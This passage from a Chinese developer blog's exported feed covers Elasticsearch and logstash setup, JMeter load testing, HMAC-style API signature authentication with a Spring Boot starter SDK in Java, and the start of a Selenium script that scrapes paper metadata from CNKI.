<h3 id="注册器模式"><a href="#注册器模式" class="headerlink" title="注册器模式"></a>注册器模式</h3><p>注册器模式就是通过一个register注册表来方便后面要调用的对象，比如说用一个map来存，然后在接口中直接调用</p>
<h2 id="Elastic-stack技术栈"><a href="#Elastic-stack技术栈" class="headerlink" title="Elastic stack技术栈"></a>Elastic stack技术栈</h2><h3 id="es分词"><a href="#es分词" class="headerlink" title="es分词"></a>es分词</h3><p>es分词是一个很有必要的技术，因为mysql自带的查询是包含查询，很不方便，比如说文章内容是：<strong>蔡徐坤是rapper</strong> ，而用户搜索输入了：<strong>蔡徐坤rapper</strong> 那么就搜不出来，但是这样的搜索正常来讲必须要搜出这篇文章，所以需要用到es和es分词器。分词器默认有空格分词器和内置分词器等等，但是我们不用这些，直接去GitHub上找ik_smart智能分词器，分词效果对中文也友好，测试效果如下：</p>
<p><img src="https://pic.imgdb.cn/item/66f0e5dff21886ccc059371f.png" alt=""></p>
<h3 id="打分机制"><a href="#打分机制" class="headerlink" title="打分机制"></a>打分机制</h3><p>打分机制是说在搜索文章的时候，分数越高的文章会排在越前面，因此这个打分机制包括说搜索内容与文章贴合度越高分数就会越高（一般来说）。比如这里我搜索vue简介作为题目，他同时也搜索出了java简介，因为打分机制给java简介也打了分，可以看到是1.73分，而搜索内容中最高分是5.05分，因此5.05分会排在1.73分的java简介前面<br><img src="https://pic.imgdb.cn/item/66f0e735f21886ccc05a8ea3.png" alt=""></p>
<p><img src="https://pic.imgdb.cn/item/66f0e7a7f21886ccc05af5a4.png" alt=""></p>
<p>这里就看出来搜索机制还是比较智能，起码可以把一些相关的都搜索出来</p>
<h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><p>es的查询方式包括在kibana的数据看板中创建可视化面板，也可以在dev tools中查询，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET post/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123; </span><br><span class="line">    &quot;bool&quot;: &#123; // 组合条件</span><br><span class="line">      &quot;must&quot;: [ // 必须都满足</span><br><span class="line">        &#123; &quot;match&quot;: &#123; &quot;title&quot;:   &quot;简介&quot;        &#125;&#125;, // match 模糊查询</span><br><span class="line">        &#123; &quot;match&quot;: &#123; &quot;content&quot;:   &quot;vue&quot;        &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      &quot;filter&quot;: [ </span><br><span class="line">        &#123; &quot;term&quot;:  &#123; &quot;status&quot;: &quot;published&quot; &#125;&#125;, // term 精确查询</span><br><span class="line">        &#123; &quot;range&quot;: &#123; &quot;publish_date&quot;: &#123; &quot;gte&quot;: &quot;2015-01-01&quot; &#125;&#125;&#125; // range 范围查询</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然也支持高亮，但是我还没搞明白怎么在前端展示出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123; </span><br><span class="line">    &quot;bool&quot;: &#123; </span><br><span class="line">      &quot;must&quot;: [  	</span><br><span class="line">        &#123; &quot;match&quot;: &#123; &quot;content&quot;:   &quot;测试&quot;        &#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;highlight&quot;: &#123;</span><br><span class="line">  &quot;fields&quot;: &#123;</span><br><span class="line">    &quot;content&quot;: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="logstash"><a href="#logstash" class="headerlink" title="logstash"></a>logstash</h3><p>logstash是一个数据库同步脚本，它使用声明式编程，只需要自己写配置然后运行logstash，他就会帮你同步你的数据到不同的数据库中，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">input &#123;</span><br><span class="line">  jdbc &#123;</span><br><span class="line">    jdbc_driver_library =&gt; &quot;path\to\mysql-connector-java-version.jar&quot;</span><br><span class="line">    jdbc_driver_class =&gt; &quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">    jdbc_connection_string =&gt; &quot;jdbc:mysql://localhost:3306/db&quot;</span><br><span class="line">    jdbc_user =&gt; &quot;root&quot;</span><br><span class="line">    jdbc_password =&gt; &quot;*********&quot;</span><br><span class="line">    parameters =&gt; &#123; &quot;favorite_artist&quot; =&gt; &quot;Beethoven&quot; &#125;</span><br><span class="line"></span><br><span class="line">	use_column_value =&gt; true</span><br><span class="line">	tracking_column =&gt; &quot;updatetime&quot;</span><br><span class="line">	tracking_column_type =&gt; &quot;timestamp&quot;</span><br><span class="line">    schedule =&gt; &quot;*/5 * * * * *&quot;</span><br><span class="line">    statement =&gt; &quot;SELECT * from post where updateTime &gt; :sql_last_value and updateTime &lt; now() order by updateTime desc&quot;</span><br><span class="line">    jdbc_default_timezone =&gt; &quot;Asia/Shanghai&quot;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">  stdout &#123; codec =&gt; rubydebug &#125;</span><br><span class="line">  elasticsearch &#123;</span><br><span class="line">    hosts =&gt; &quot;127.0.0.1:9200&quot;</span><br><span class="line">    index =&gt; &quot;post&quot;</span><br><span class="line">	document_id =&gt; &quot;%&#123;id&#125;&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要设定好input的数据库和output的数据库，将mysql-connector的jar包加入到目录下，再执行指令<code>./logstash.bat -f ..\config\mytask.conf</code> 即可开始同步。同时logstash还可作为定时脚本使用，监控input数据库的数据，如果发生更新，则定时同步到output数据库中</p>
<h2 id="JMeter压力测试系统"><a href="#JMeter压力测试系统" class="headerlink" title="JMeter压力测试系统"></a>JMeter压力测试系统</h2><p>首先新建线程组，设定好HTTP的测试的请求头和请求的地址和端口号：</p>
<p><img src="https://pic.imgdb.cn/item/66f128ccf21886ccc09bdaf2.png" alt=""></p>
<p><img src="https://pic.imgdb.cn/item/66f1292ff21886ccc09c38f2.png" alt=""></p>
<p>最后就是新建一个请求启动就行：</p>
<p><img src="image-20240923163953997.png" alt="image-20240923163953997"></p>
<p>这里注意填好api地址和你需要过滤得到的数据，然后就可以查看结果了：</p>
<p><img src="https://pic.imgdb.cn/item/66f12779f21886ccc09a9798.png" alt=""></p>
<p><img src="https://pic.imgdb.cn/item/66f127bef21886ccc09adf6a.png" alt=""></p>
<p><img src="https://pic.imgdb.cn/item/66f127d0f21886ccc09af05c.png" alt=""></p>
<p>至此聚合报告中就可以看到压力测试的结果了。</p>
]]></content>
      <categories>
        <category>项目开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>关于开发api开放平台过程中的知识</title>
    <url>/2024/08/25/%E5%85%B3%E4%BA%8E%E5%BC%80%E5%8F%91api%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p> 这是在开发api开放平台中用到的一些新知识，这些概念对于初学者来说确实比较陌生，因此这里写一篇详细的开发过程和涉及到的知识。</p>
<h2 id="API签名认证"><a href="#API签名认证" class="headerlink" title="API签名认证"></a>API签名认证</h2><p>在开发API开放平台的时候，需要管理API的调用，这里会涉及到一个问题，就是必须对api的发送作出限制，限制用户的调用，限制调用的次数，判定调用者的身份是否确实为该用户本身（中间人拦截再重复调用）。因此使用到了叫API签名认证的技术，本文对这个技术的学习过程作出一些总结。</p>
<h3 id="具体实现方法"><a href="#具体实现方法" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>签名认证本质上就是后端去校验前端传来的签名，具体实现的方法第一种是通过请求头 request header来实现，首先我们必须在用户的表上添加属性 assessKey和secretKey，这个是两个标识，至于为什么要两个属性可以参考一下登陆系统要用的用户名和密码。</p>
<p><img src="https://pic.imgdb.cn/item/66c40e3fd9c307b7e92035c4.png" alt=""></p>
<p><img src="https://pic.imgdb.cn/item/66c40e35d9c307b7e9202d8c.png" alt=""></p>
<p>当然这两个key肯定不能写死，这里为了先跑通整个流程，先写死了，最后应该是在注册的时候生成？这个还需要再思考一下。</p>
<p>接下来我们在调用接口的时候传入这两个key，打个断点调试一下，可以得到结果：<br><img src="https://pic.imgdb.cn/item/66c432d3d9c307b7e945eb6e.png" alt=""></p>
<p>进入到这个判断，就说明校验key的逻辑完成了✅。</p>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这种方法是一种方法，但是咱们来想一想，这样子做的话，前端在调用api发请求的时候也将assessKey和secretKey发送到了后端，这样子校验是非常危险的，因为同时将两个Key暴露在了网络传输当中，如果前端发送的请求被拦截，或者攻击者重复发送请求，都可能成功调用起后端接口，所以这种方法还需要进一步提升，提升的方法可以参考登录注册的方法，进行加密算法。</p>
<h3 id="进一步的改进"><a href="#进一步的改进" class="headerlink" title="进一步的改进"></a>进一步的改进</h3><p>因为直接将key放在请求头在服务器之间传递是非常危险的，我们必须给密钥做加密。这里我的做法是根据密钥生成一个sign，再去跟后端比对。</p>
<h4 id="签名sign的生成"><a href="#签名sign的生成" class="headerlink" title="签名sign的生成"></a>签名sign的生成</h4><p>签名的生成过程：<strong>用户参数     +    密钥    =&gt;    签名生成算法（MD5,HMac,Sha1)     =&gt;    不可解密的值</strong> </p>
<p>举个例子，abc+user1=&gt;afasfasnwg，这个就是个乱码了，即使请求被拦截，抓出来也看不出这是个什么。接下来还有一个问题，就是怎么防止请求重放，这个可以用到时间戳和加入随机数来实现，后端存储随机数，加入时间戳限制来刷新随机数，检验有效期。</p>
<h4 id="开始coding😭"><a href="#开始coding😭" class="headerlink" title="开始coding😭"></a>开始coding😭</h4><p>首先我们理一理请求头里都有些什么元素：</p>
<ol>
<li>assessKey</li>
<li>serectKey        这个一定不能传出去，所以不在请求头里🌟🌟🌟‼️</li>
<li>nonce   随机数</li>
<li>body   用户参数</li>
<li>timestamp   时间戳</li>
<li>sign   签名</li>
</ol>
<p>确定之后就可以写生成签名的函数和生成请求头函数了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成签名，拼接请求头的字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> sign</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">getSign</span><span class="params">(Map&lt;String,String&gt; headers,String secretKey)</span>&#123;</span><br><span class="line">        Digester md5=<span class="keyword">new</span> <span class="title class_">Digester</span>(DigestAlgorithm.SHA256);</span><br><span class="line">        <span class="type">String</span> <span class="variable">nonce</span> <span class="operator">=</span> headers.get(<span class="string">&quot;nonce&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> headers.get(<span class="string">&quot;body&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">timestamp</span> <span class="operator">=</span> headers.get(<span class="string">&quot;timestamp&quot;</span>);</span><br><span class="line">        String content=nonce+<span class="string">&#x27;.&#x27;</span>+body+<span class="string">&#x27;.&#x27;</span>+timestamp+<span class="string">&#x27;.&#x27;</span>+secretKey;</span><br><span class="line">        <span class="keyword">return</span> md5.digestHex(content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置请求头，要注意一定不能将secretKey发送给后端</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> headers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; <span class="title function_">setKeys</span><span class="params">(String body)</span>&#123;</span><br><span class="line">        Map&lt;String,String&gt; headers=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        headers.put(<span class="string">&quot;assessKey&quot;</span>,assessKey);</span><br><span class="line">        <span class="comment">//secretKey一定不能传出去</span></span><br><span class="line">        <span class="comment">//headers.put(&quot;secretKey&quot;,secretKey);</span></span><br><span class="line">        headers.put(<span class="string">&quot;nonce&quot;</span>, RandomUtil.randomNumbers(<span class="number">4</span>));</span><br><span class="line">        headers.put(<span class="string">&quot;body&quot;</span>,body);</span><br><span class="line">        headers.put(<span class="string">&quot;timestamp&quot;</span>,String.valueOf(System.currentTimeMillis()/<span class="number">1000</span>));</span><br><span class="line">        headers.put(<span class="string">&quot;sign&quot;</span>,getSign(headers,secretKey));</span><br><span class="line">        <span class="keyword">return</span> headers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里建议把签名生成单独拿出来做工具类，这样校验的时候也方便，调用接口的签名生成之后，就要去服务端校验接口，校验接口的思路就很简单了，取出请求头中的nonce, timestamp 和 body，数据库查表找到secretKey，调用签名生成工具生成服务端签名，和前端传来的签名比对，比对不匹配就抛出异常。写完之后打好断点调试一下：</p>
<p><img src="https://pic.imgdb.cn/item/66c44b05d9c307b7e968839b.png" alt=""></p>
<p>这里看到成功进入判断逻辑，两边的签名是一致的，到这里签名认证环节就结束了。</p>
<h2 id="starter开发"><a href="#starter开发" class="headerlink" title="starter开发"></a>starter开发</h2><p>在开发API开放平台的时候，由于我们需要让用户调用接口，而用户不应该自己去使用 调用第三方接口的库，这对于开发者来说太麻烦，平台展现给开发者的情况应该是：开发者应该只需要关心自己要用什么接口，传什么参数，密钥是什么等等，所以我们需要开发一个便于开发者使用的sdk。</p>
<p>首先我们来开发starter，starter是个什么东西呢，我的理解呢就是一个工具包，跟jar包有那么一点像，但是它可以直接在application.yml中配置，方便自动创建出这么一个客户端之类的东西</p>
<h3 id="开发starter"><a href="#开发starter" class="headerlink" title="开发starter"></a>开发starter</h3><p>首先呢我们新建springboot项目，引入依赖lombok和spring configuration processor，进入pom.xml文件中删除build标签下所有内容，因为我们不需要将它构建成一个可运行的springboot项目，随后删除主类，因为我们不需要启动这个项目，我们只是需要做一个工具包出来。这里有一个小小的坑，就是依赖要引入一下spring web的依赖，如果不引入的话呢，生成不了resource目录和application.yml文件，但是我看别人好像没有这个问题，当然目的就是为了生成resource目录。</p>
<p>前置工作做完之后就是写你自己的配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.si1v3r.si1v3rapiclientsdk;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.si1v3r.si1v3rapiclientsdk.client.Si1v3rApiClient;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(&quot;si1v3r.client&quot;)</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">si1v3rApiClientConfig</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String assessKey;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String secretKey;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Si1v3rApiClient <span class="title function_">si1v3rApiClient</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Si1v3rApiClient</span>(assessKey,secretKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里注意要引入你相对应的客户端和对象，比如我这里就是Si1v3rApiClient，如果有必要的依赖和工具类也要一并加入进来，做好之后在resource目录下新建一个META-INF文件夹，新建spring.factories文件，加入配置路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#spring boot starter</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=com.si1v3r.si1v3rapiclientsdk.si1v3rApiClientConfig</span><br></pre></td></tr></table></figure>
<p>这里的路径是指定你的配置类的路径，这些做完以后就可以去生命周期里install了，这样会生成一个包，同时我们要记住这个sdk项目的groupId，artifactId, version这三个信息，到虚拟调用api去导入</p>
<p><img src="https://pic.imgdb.cn/item/66c59742d9c307b7e90d0fa8.png" alt=""></p>
<p><img src="https://pic.imgdb.cn/item/66c598acd9c307b7e90e398f.png" alt=""></p>
<p>这里能这么导入的原因其实是因为生成的maven包存在了本地的mvn仓库里，所以本地能直接导入，如果要想让其他人也能用，要上传到远程的mvnrepository。导入成功后我们进入application.yml，发现可以直接配置了（nb。</p>
<p><img src="https://pic.imgdb.cn/item/66c595aad9c307b7e90bbe5d.png" alt=""></p>
<p>这里配置完两个密钥，就可以去写单元测试了</p>
<p><img src="https://pic.imgdb.cn/item/66c6f973d9c307b7e9b3562e.png" alt=""></p>
<h3 id="恶心的bug"><a href="#恶心的bug" class="headerlink" title="恶心的bug"></a>恶心的bug</h3><p>但是第一次测的时候会出现一个hutools连接拒绝的问题，然后我们能发现项目的启动端口变成sdk的端口了（。这个问题相当逆天，报错图用一下别人的：<br><img src="https://gitee.com/Jinze_JZ/image-picgo/raw/master/typora/202211112357539.png" alt="image-20221111235729445"></p>
<p>这里我还发现项目启动端口变成sdk里默认的端口8080了，这就很蛋疼，说明我们一开始引入spring web的依赖的思路是不行的，一旦引入spring web会导致对端口进行配置，即使我后来删了application.yml还是更改了，很恶心。最后解决方法还是得一开始不引入这个spring web，自己去新建resources目录和META- INF目录，然后流程不变再生成导入一次，最后打开项目端口，运行单元测试，能发现测试终于过了T_T。</p>
<p><img src="https://pic.imgdb.cn/item/66c6fb14d9c307b7e9b49f08.png" alt=""></p>
]]></content>
      <categories>
        <category>项目开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>关于爬虫的总结</title>
    <url>/2023/06/01/%E5%85%B3%E4%BA%8E%E7%88%AC%E8%99%AB%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>最近在某著名985学子的压力下看了看了他们的python大作业，发现完全不会（，又是日常被薄纱的一天（，然后就有了这篇总结，记录一下这几天的历程。爬虫其实是属于我一直想学，一直没学的东西，正好趁这次机会迈出第一步。</p>
<h2 id="request库-请求分析"><a href="#request库-请求分析" class="headerlink" title="request库+请求分析"></a>request库+请求分析</h2><p>这是我尝试的第一种方式，但是失败了。思路是通过fiddler工具对浏览器进行抓包，通过模拟正常用户的行为来分析请求，再用request库来进行发送请求。大作业的内容是爬取知网上的文献，内容包括题名，作者。首先我们先抓包，这是刚进入网页的请求：</p>
<p><img src="https://s2.loli.net/2023/06/02/ETd1l6pkbQX7O8m.png" alt="抓包1 - 副本.png"></p>
<p>这里说明网页发送get请求得到初始界面，这个过程我在postman里模拟发送请求也实现了，但是问题是出现在后面的请求中。接下来就是检索关键词之后发送的post请求，拿到一个具有多个文献名称，作者等信息的检索页面，请求头和请求体如下：</p>
<p><img src="https://s2.loli.net/2023/06/02/OsyFlIHb5Ru4twW.png" alt="抓包2 - 副本.png"></p>
<p><img src="https://s2.loli.net/2023/06/02/XneLh5WOa3rtlIT.png" alt="抓包3 - 副本.png"></p>
<p>这里我用postman构造请求头和请求体发送请求，但是得到的却是下面这种情况，不知道是什么原因，后来我也是放弃了这种方式。当然有知道原因的或者是知道这种方法怎么做的请cue我一下（</p>
<p><img src="https://s2.loli.net/2023/06/02/Krcie6a2vuwMIB9.png" alt="发请求 - 副本.png"></p>
<h2 id="用selenium模拟浏览器操作"><a href="#用selenium模拟浏览器操作" class="headerlink" title="用selenium模拟浏览器操作"></a>用selenium模拟浏览器操作</h2><p>selenium是一个自动化测试的工具，可以模拟浏览器的行为，这样就模拟用户搜索信息的全过程，再把内容写入excel表就行</p>
<p>首先配置好浏览器环境和条件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">desired_capabilities = DesiredCapabilities.CHROME</span><br><span class="line">desired_capabilities[<span class="string">&quot;pageLoadStrategy&quot;</span>] = <span class="string">&quot;none&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置谷歌驱动器的环境</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 设置chrome不加载图片，提高速度</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;prefs&quot;</span>, &#123;<span class="string">&quot;profile.managed_default_content_settings.images&quot;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="comment"># 取消自动补全，不过我好像没看出来有什么用（</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-autocomplete&quot;</span>)</span><br><span class="line"><span class="comment"># # 设置不显示窗口</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建一个谷歌驱动器</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line"><span class="comment"># 设置搜索来源</span></span><br><span class="line">source = <span class="string">&quot;经济&quot;</span></span><br><span class="line"><span class="comment"># 设置所需篇数</span></span><br><span class="line">papers_need = <span class="number">100</span></span><br><span class="line"><span class="comment">#将窗口最大化，不然好像有点问题</span></span><br><span class="line">driver.maximize_window()</span><br><span class="line"><span class="comment"># 设置网址</span></span><br><span class="line">url=<span class="string">&quot;https://kns.cnki.net/kns/advsearch?dbcode=SCDB&quot;</span></span><br><span class="line"><span class="comment"># 连接上网址</span></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 至此就成功打开了浏览器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;已成功打开浏览器，url为：&#x27;</span>,url)</span><br></pre></td></tr></table></figure>
<p>随后就是根据不同的网页来找搜索框，输入内容，搜索</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入内容到文献来源框</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;&#x27;&#x27;//*[@id=&quot;magazine_value1&quot;]&#x27;&#x27;&#x27;</span>))).send_keys(source)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功输入来源:&quot;</span>,source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&quot;/html/body/div[2]/div[3]/div[3]/div[2]/div[1]/div[9]&quot;</span>))).click()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得网页内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_item</span>(<span class="params">num,col=<span class="number">1</span></span>):</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        index%=<span class="number">20</span></span><br><span class="line">        title_XPATH = <span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[2]/a&#x27;</span><span class="comment">#题名</span></span><br><span class="line">        author_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[3]&#x27;</span><span class="comment">#作者</span></span><br><span class="line">        source_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[4]&#x27;</span><span class="comment">#来源</span></span><br><span class="line">        time_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[5]&#x27;</span><span class="comment">#发布时间</span></span><br><span class="line">        database_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[6]&#x27;</span><span class="comment">#数据库</span></span><br><span class="line">        refer_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[7]&#x27;</span><span class="comment">#被引</span></span><br><span class="line">        download_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[8]&#x27;</span><span class="comment">#下载</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样模拟就成功了，但是这里还有个问题，就是来源搜索框中有自动补全，在主题中输入内容之后自动补全触发，这个时候就定为不到网页的内容了，而来源输入又没有这个问题。因此这个脚本只能往来源中输入内容，不能往主题中输入内容，如果知道怎么解决的请cue我一下（</p>
<p>最后附上整个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.desired_capabilities <span class="keyword">import</span> DesiredCapabilities</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">desired_capabilities = DesiredCapabilities.CHROME</span><br><span class="line">desired_capabilities[<span class="string">&quot;pageLoadStrategy&quot;</span>] = <span class="string">&quot;none&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置谷歌驱动器的环境</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 设置chrome不加载图片，提高速度</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;prefs&quot;</span>, &#123;<span class="string">&quot;profile.managed_default_content_settings.images&quot;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-autocomplete&quot;</span>)</span><br><span class="line"><span class="comment"># # 设置不显示窗口</span></span><br><span class="line"><span class="comment">#options.add_argument(&#x27;--headless&#x27;)</span></span><br><span class="line"><span class="comment"># 创建一个谷歌驱动器</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line"><span class="comment"># 设置搜索来源和主题</span></span><br><span class="line">source = <span class="string">&quot;经济&quot;</span></span><br><span class="line">theme = <span class="string">&quot;导购&quot;</span></span><br><span class="line"><span class="comment"># 设置所需篇数</span></span><br><span class="line">papers_need = <span class="number">100</span></span><br><span class="line">driver.maximize_window()</span><br><span class="line"><span class="comment"># 设置网址</span></span><br><span class="line">url=<span class="string">&quot;https://kns.cnki.net/kns/advsearch?dbcode=SCDB&quot;</span></span><br><span class="line"><span class="comment"># 连接上网址</span></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;已成功打开浏览器，url为：&#x27;</span>,url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开一个excel实例</span></span><br><span class="line">workbook=xlwt.Workbook()</span><br><span class="line">sheet=workbook.add_sheet(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;题名&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;作者&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;来源&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;发表时间&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;数据库&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">5</span>,<span class="string">&#x27;被引&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">6</span>,<span class="string">&#x27;下载&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">7</span>,<span class="string">&#x27;链接&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入内容到文献来源框</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span 